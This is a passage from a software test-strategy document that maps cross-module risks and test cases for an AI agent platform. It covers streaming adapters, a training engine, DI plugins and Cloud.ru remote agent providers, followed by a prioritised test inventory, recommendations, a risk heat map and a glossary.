1. **Version skew between stream-pipeline and messenger-adapters**: If `MessengerStreamAdapter` interface changes in messenger-adapters v2.0 but stream-pipeline still expects v1.x, the composition root will wire incompatible types. Test: register stream-pipeline with messenger-adapters v1.x interface; verify TypeScript compilation fails if interface is incompatible; verify runtime validation catches type mismatch if TypeScript is bypassed.

2. **Adapter registration timing**: The stream pipeline must resolve the correct adapter before the first message arrives. If the composition root registers messenger adapters after the first request, the streaming handler will receive `null` for `streamAdapter` and fall back to batch mode unnecessarily. Test: delay adapter registration by 1 second after boot; send message at 500ms; verify batch fallback is used; verify streaming activates after adapter registration.

3. **Event bus coordination**: ADR-010's `ProgressMessageSent` event must be emittable through ADR-012's event bus. If the stream pipeline does not import the event bus (because it has zero required internal dependencies), event emission must be injected via the composition root. Test: verify `ProgressMessageSent` events appear in the event bus spy when streaming is active.

**Actionable Test Cases:**

- TC-CROSS-001: Register TelegramStreamAdapter and MaxStreamAdapter as plugins; verify both resolve from container with correct `MessengerStreamConfig` values.
- TC-CROSS-002: Unregister TelegramStreamAdapter mid-stream; verify the active stream completes (does not crash) but subsequent streams use batch fallback.
- TC-CROSS-003: Hot-reload MessengerStreamAdapter plugin; verify new adapter is used for the next stream without restart.

---

### 6.2 ADR-011 (Training) x ADR-012 (Plugins): Module Isolation

**Interaction:** ADR-011's `@openclaw/training-engine` module depends on multiple sub-managers (ClaudeMdManager, KnowledgeManager, ToolRegistry, etc.) that must be internally cohesive but externally isolated per ADR-012's module independence invariant. The training engine depends optionally on `@openclaw/tenant-manager` for tenant context.

**Quality Risks:**

1. **Training engine accessing tenant-manager internals**: If the training engine bypasses the `TenantManager` interface and directly reads tenant filesystem paths, it violates module independence. Test: replace TenantManager with a stub that returns different filesystem paths; verify training engine uses the provided paths, not hardcoded ones.

2. **Plugin lifecycle and training state**: If the training engine plugin is unregistered (e.g., during hot-reload), all in-flight training commands must be drained or rejected. Incomplete CLAUDE.md mutations during unregistration could leave corrupted state. Test: unregister training engine while `addRule()` is writing to filesystem; verify either the rule is fully written or the file is unchanged (atomic write semantics).

3. **Event bus for training events**: ADR-011 defines domain events (RuleAdded, KnowledgeUploaded, etc.) that should flow through ADR-012's event bus for cross-cutting concerns (audit logging, metrics). If the training engine emits events through its own internal emitter instead of the shared event bus, cross-module observers miss them. Test: register an audit handler on the event bus for `RuleAdded`; execute `/train add rule`; verify the handler fires.

**Actionable Test Cases:**

- TC-CROSS-004: Instantiate training engine standalone (without DI container); verify it functions with a mock tenant resolver.
- TC-CROSS-005: Verify that `TrainingEngine.execute()` emits domain events through the event bus, not a private emitter.
- TC-CROSS-006: Register training engine as a scoped service (per-tenant); verify two tenants get independent CLAUDE.md states.

---

### 6.3 ADR-013 (AI Fabric) x ADR-012 (Plugins): Remote Agent Orchestration

**Interaction:** ADR-013's `IAgentProvider` implementations (ClaudeCodeCliProvider, CloudRuAgentProvider, CloudRuAgentSystemProvider) are registered as plugins through ADR-012's DI container. The `HybridOrchestrator` resolves all registered providers at construction and routes requests based on capability matching.

**Quality Risks:**

1. **Dynamic provider registration**: ADR-011 allows users to register new agents via `/agent create`, which should create a new `CloudRuAgentProvider` and register it in the DI container at runtime. ADR-012's container may not support post-build registration if `build()` freezes the container. Test: call `container.build()`; then register a new agent provider; verify it is resolvable and routable.

2. **Provider health aggregation**: ADR-012's health check aggregates all plugin statuses. ADR-013 providers that are COOLED (healthy but slow) should report `degraded` rather than `unhealthy`. If health aggregation treats `degraded` as `unhealthy`, it may trigger false alarms. Test: set CloudRuAgentProvider to return `degraded` status; verify aggregate health reports `degraded` (not `unhealthy`).

3. **Circuit breaker state and plugin lifecycle**: The circuit breaker for each provider (ADR-013) is tightly coupled to the provider instance. If the plugin is unregistered and re-registered, the circuit breaker state must be reset. Carrying over an open circuit breaker to a fresh provider instance would prevent routing to a recovered backend. Test: trigger circuit breaker open; unregister and re-register provider; verify circuit breaker is closed.

**Actionable Test Cases:**

- TC-CROSS-007: Register 3 IAgentProvider implementations as plugins; verify HybridOrchestrator resolves all three and routes correctly.
- TC-CROSS-008: Unregister a provider plugin; verify orchestrator stops routing to it immediately (no stale reference).
- TC-CROSS-009: Verify circuit breaker reset on provider re-registration.

---

### 6.4 ADR-010 (Streaming) x ADR-013 (AI Fabric): Local vs. Remote Streaming

**Interaction:** ADR-010's streaming pipeline reads Claude Code subprocess stdout (local, `stream-json` format). ADR-013's CloudRuAgentProvider streams SSE from Cloud.ru API (remote, OpenAI-compatible SSE format). Both must feed into the same `TokenAccumulator` and `MessengerStreamAdapter` chain.

**Quality Risks:**

1. **Event format mismatch**: ADR-010's `StreamParser` expects `StreamJsonEvent` (Claude Code `stream-json`). ADR-013's `CloudRuAgentProvider.stream()` emits `AgentEvent`. These are different types. A mapping layer is required but not defined in either ADR. Test: feed `AgentEvent` objects directly into `StreamParser`; verify it fails. Then feed through a mapper; verify tokens arrive correctly.

2. **Latency differential**: Local streaming has TTFT < 3s. Remote Cloud.ru streaming has TTFT < 5s (including network). The TokenAccumulator's flush interval is tuned for local latency. If the first token arrives at 5s, the typing indicator timer may have already confused the user. Test: simulate 5s delay before first token; verify typing indicator remains active; verify no "empty message" is sent.

3. **Error semantics**: ADR-010's `StreamError` has codes like `SUBPROCESS_CRASH` that are meaningless for remote providers. ADR-013's `AgentError` has its own taxonomy. The streaming handler must normalize error types. Test: trigger a Cloud.ru 503 error during streaming; verify it maps to a `StreamError` with appropriate code and message.

4. **Backpressure handling**: Local subprocess stdout has OS-level buffering. Remote SSE may arrive faster than the messenger API can consume (especially on MAX with shared 30 RPS). The pipeline must apply backpressure to the SSE consumer. Test: stream 1000 tokens in 1 second from mock Cloud.ru API; verify TokenAccumulator buffers correctly and does not exceed MAX rate limit.

**Actionable Test Cases:**

- TC-CROSS-010: Implement AgentEvent-to-StreamJsonEvent mapper; verify 1:1 token fidelity for 10,000 tokens.
- TC-CROSS-011: Run streaming pipeline with remote provider (MockCloudRuApi) end-to-end to Telegram mock; verify progressive message updates.
- TC-CROSS-012: Simulate Cloud.ru SSE connection drop at token 50; verify FALLBACK_BATCH delivers 50 accumulated tokens.
- TC-CROSS-013: Verify typing indicator persists correctly for both local (TTFT ~1s) and remote (TTFT ~5s) providers.

---

### 6.5 ADR-011 (Training) x ADR-013 (AI Fabric): Training Applies to Remote Agents

**Interaction:** ADR-011's CLAUDE.md rules are injected into Claude Code CLI via `--cwd` pointing to the tenant workspace. But Cloud.ru AI Agents (ADR-013) have their own `instructions` field set at agent creation time. CLAUDE.md rules may not automatically apply to remote agents.

**Quality Risks:**

1. **Training parity gap**: A user adds a rule "Always respond in Russian" via `/train add rule`. This rule applies to local Claude Code CLI but not to Cloud.ru remote agents unless the rule is also pushed to the agent's `instructions` field. Test: add rule via training engine; invoke both local and remote providers; verify both respect the rule (or that the user is warned about partial applicability).

2. **MCP tool registration scope**: ADR-011's `/tool add` registers an MCP server in the tenant's config, which Claude Code CLI reads. But Cloud.ru agents have their own MCP server configuration. Registering a tool locally does not make it available to remote agents unless the federation (ADR-013) explicitly propagates it. Test: register MCP tool via training engine; invoke remote Cloud.ru agent; verify it can (or cannot) use the tool, with appropriate documentation.

3. **Knowledge base scope**: ADR-011's `/knowledge add` uploads to Cloud.ru Managed RAG. This knowledge should be accessible to both local Claude Code (via MCP tool) and remote Cloud.ru agents (via native RAG integration). But the RAG collection namespace must be correctly shared. Test: upload document via training engine; search via local agent; search via remote agent; verify both return relevant results.

**Actionable Test Cases:**

- TC-CROSS-014: Add training rule via ADR-011; invoke ADR-013 CloudRuAgentProvider; verify the rule is either applied to the remote agent's instructions or the user is notified of the limitation.
- TC-CROSS-015: Upload knowledge via ADR-011; verify both local and remote agents can retrieve it via RAG search.
- TC-CROSS-016: Register MCP tool via ADR-011; verify McpFederation (ADR-013) includes it in the tool index.

---

### 6.6 Interaction Risk Summary

| Interaction Point | Risk Level | Primary Concern | Key Test Case |
|-------------------|-----------|-----------------|---------------|
| ADR-010 x ADR-012 (streaming adapters as plugins) | Medium | Version skew, registration timing | TC-CROSS-001, TC-CROSS-002 |
| ADR-011 x ADR-012 (training engine isolation) | Low | Module boundary violations, event routing | TC-CROSS-004, TC-CROSS-005 |
| ADR-013 x ADR-012 (agent providers as plugins) | Medium | Dynamic registration, health aggregation | TC-CROSS-007, TC-CROSS-008 |
| ADR-010 x ADR-013 (local vs. remote streaming) | High | Event format mismatch, latency differential | TC-CROSS-010, TC-CROSS-011 |
| ADR-011 x ADR-013 (training applies to remote agents) | High | Training parity gap, scope isolation | TC-CROSS-014, TC-CROSS-015 |
| ADR-010 x ADR-011 (streaming + training) | Low | Minimal direct interaction | N/A |

---

## 7. Consolidated Test Case Inventory

### Priority 1: Must-Have (Blocks Acceptance)

| ID | ADR | Category | Description | Type |
|----|-----|----------|-------------|------|
| TC-001 | 010 | Functionality | StreamParser emits correct tokens for valid stream-json | Unit |
| TC-002 | 010 | Reliability | Fallback to batch on first PARSE_ERROR | Unit |
| TC-003 | 010 | Performance | TTFT < 3 seconds with mock subprocess | Integration |
| TC-004 | 010 | Reliability | 5-minute hard timeout kills subprocess and delivers partial text | Integration |
| TC-005 | 011 | Functionality | `/train add rule` appends to correct section and increments version | Unit |
| TC-006 | 011 | Security | Prompt injection in rule text rejected | Unit |
| TC-007 | 011 | Security | SSRF via `/tool add` with private IP rejected | Unit |
| TC-008 | 011 | Security | Shell injection in hook handler rejected | Unit |
| TC-009 | 011 | Data | Export/import round-trip produces identical configuration | Integration |
| TC-010 | 012 | Functionality | Composition root resolves all 8 modules without error | Integration |
| TC-011 | 012 | Functionality | Circular dependency detected and rejected at build time | Unit |
| TC-012 | 012 | Reliability | Module disposal in reverse dependency order | Unit |
| TC-013 | 013 | Functionality | IAgentProvider contract test passes for all 3 implementations | Unit |
| TC-014 | 013 | Functionality | HybridOrchestrator routes by capability glob | Unit |
| TC-015 | 013 | Reliability | Circuit breaker opens after 3 failures, routes to fallback | Unit |
| TC-016 | 013 | Security | API key not present in config file or log output | Unit |

### Priority 2: Should-Have (Important Quality)

| ID | ADR | Category | Description | Type |
|----|-----|----------|-------------|------|
| TC-017 | 010 | Reliability | Unicode surrogate pairs handled across chunk boundaries | Unit |
| TC-018 | 010 | Operational | MAX rate limit adaptive flush interval under load | Integration |
| TC-019 | 010 | Reliability | Telegram message deletion during streaming handled gracefully | Integration |
| TC-020 | 011 | Data | Concurrent training commands serialized per tenant | Integration |
| TC-021 | 011 | Reliability | CLAUDE.md rollback restores exact previous version | Unit |
| TC-022 | 011 | Performance | AgentDB semantic search < 200ms for 10K entries | Performance |
| TC-023 | 012 | Performance | Container resolution < 1ms for singleton | Performance |
| TC-024 | 012 | Security | Plugin cannot access undeclared dependency | Unit |
| TC-025 | 013 | Reliability | Cloud.ru outage degrades to local-only execution | Integration |
| TC-026 | 013 | Operational | Cold start handling within 30 seconds | Integration |
| TC-027 | Cross | Functionality | AgentEvent-to-StreamJsonEvent mapper preserves token fidelity | Unit |
| TC-028 | Cross | Functionality | Streaming pipeline works with both local and remote providers | Integration |

### Priority 3: Nice-to-Have (Robustness)

| ID | ADR | Category | Description | Type |
|----|-----|----------|-------------|------|
| TC-029 | 010 | Edge | Empty stream (zero tokens) delivers "No response" message | Unit |
| TC-030 | 010 | Edge | Rapid user follow-up during active stream rejected with message | Integration |
| TC-031 | 011 | Edge | 10,000 rules across all sections: render time < 100ms | Performance |
| TC-032 | 011 | Edge | Auto-learn false positive rate < 5% | Integration |
| TC-033 | 012 | Edge | Container scope memory leak detection over 10K requests | Performance |
| TC-034 | 012 | Edge | Event bus handler ordering deterministic for audit | Unit |
| TC-035 | 013 | Edge | MCP tool name collision resolution via namespacing | Unit |
| TC-036 | 013 | Edge | Cloud.ru agent status transition mid-request handled | Integration |
| TC-037 | Cross | Edge | Training rule applied to remote Cloud.ru agent | Integration |
| TC-038 | Cross | Edge | Dynamic provider registration after container.build() | Integration |

---

## 8. Recommendations

### Immediate Actions

1. **Define the AgentEvent-to-StreamJsonEvent mapping layer** (ADR-010 x ADR-013 gap). This is the highest-risk cross-ADR interaction. Without it, streaming from remote providers will not work through the existing pipeline.

2. **Specify training parity policy for remote agents** (ADR-011 x ADR-013 gap). Document whether CLAUDE.md rules are intended to apply to Cloud.ru agents, and if so, define the synchronization mechanism (push to agent `instructions` field on rule change).

3. **Add post-build registration support to DI container** (ADR-012 x ADR-013 need). The current `build()` + freeze pattern conflicts with dynamic agent registration through `/agent create`. Either allow post-build registration or use a separate dynamic registry.

4. **Add health status taxonomy** (ADR-012 x ADR-013 alignment). Standardize `healthy`/`degraded`/`unhealthy` semantics across all modules. COOLED Cloud.ru agents should map to `degraded`, not `unhealthy`.

### Process Improvements

5. **Contract tests between modules**: Establish a shared contract test suite that validates all `IAgentProvider` implementations, all `MessengerAdapter` implementations, and all `StreamSink` implementations against their interface specifications. Run in CI on every PR.

6. **Cross-ADR integration test suite**: Create a dedicated integration test that boots the full composition root with all 8 modules using test doubles for external services (Cloud.ru API, Telegram API, filesystem). This catches wiring issues that individual module tests miss.

7. **Chaos testing for circuit breakers**: Implement a chaos testing mode that randomly fails Cloud.ru API calls, MCP server connections, and subprocess executions to validate that circuit breakers, fallbacks, and graceful degradation work under realistic failure conditions.

8. **Performance regression suite**: Establish baseline benchmarks for the performance thresholds in this QCSD (TTFT, parser throughput, container resolution, etc.) and run them in CI to detect regressions early.

---

## Appendix A: Risk Heat Map

```
Impact
  ^
  |  Critical  |           | R011-02   |           | R013-04   |
  |            |           | R011-03   |           |           |
  |  High      | R010-01   | R011-01   | R013-03   |           |
  |            | R012-02   | R012-07   |           |           |
  |  Medium    | R011-04   | R010-02   | R012-03   |           |
  |            | R011-08   | R010-05   | R013-02   |           |
  |            | R010-06   | R013-05   |           |           |
  |  Low       | R010-04   | R010-08   | R012-04   |           |
  |            | R012-05   | R011-07   | R013-07   |           |
  |            | R013-06   | R013-08   |           |           |
  +------------+-----------+-----------+-----------+-----------+
               Low         Medium      High        Very High
                                Probability -->
```

## Appendix B: Glossary

| Term | Definition |
|------|-----------|
| HTSM | Heuristic Test Strategy Model -- framework for systematically identifying quality criteria |
| QCSD | Quality Criteria Session Document -- structured record of quality analysis outcomes |
| TTFT | Time-to-First-Token -- latency from user request to first visible response content |
| FSM | Finite State Machine -- the ResponseStream lifecycle state model |
| SSRF | Server-Side Request Forgery -- attack where server makes requests to internal resources |
| A2A | Agent-to-Agent -- Cloud.ru's protocol for inter-agent communication |
| MCP | Model Context Protocol -- standard for tool server communication |
| DI | Dependency Injection -- pattern for composing modules with explicit dependencies |
| RAG | Retrieval-Augmented Generation -- pattern for augmenting LLM with external knowledge |
| EWC++ | Elastic Weight Consolidation -- continual learning method preventing catastrophic forgetting |
| HNSW | Hierarchical Navigable Small World -- graph-based approximate nearest neighbor algorithm |
